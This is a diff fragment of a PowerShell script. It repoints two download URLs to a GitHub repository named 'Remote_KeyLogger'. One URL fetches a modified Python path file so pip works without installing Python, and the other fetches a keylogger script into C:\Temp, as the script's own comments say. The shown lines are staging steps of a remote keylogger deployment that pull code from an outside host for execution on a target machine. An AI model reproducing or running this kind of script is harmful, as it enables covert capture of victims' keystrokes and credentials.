@@ -44,7 +44,7 @@ Remove-Item python311._pth
 
 #Downloading the new edited python311._pth file, that allows PIP to run, without installing python on computer
 
-$sourceUrl = 'https://raw.githubusercontent.com/OlegLeo/RemoteScriptTest/main/python311._pth';
+$sourceUrl = 'https://raw.githubusercontent.com/OlegLeo/Remote_KeyLogger/main/python311._pth';
 
 $destination4replacement = "C:\Temp\Python3\python311._pth";
 
@@ -63,7 +63,7 @@ timeout 15
 
 # Downloading the keylogger python script
 
-$sourceKeyLogger = 'https://raw.githubusercontent.com/OlegLeo/RemoteScriptTest/main/keyloggerscript.py';
+$sourceKeyLogger = 'https://raw.githubusercontent.com/OlegLeo/Remote_KeyLogger/main/keyloggerscript.py';
 
 $destination4keylogger = "C:\Temp\keyloggerscript.py";
 
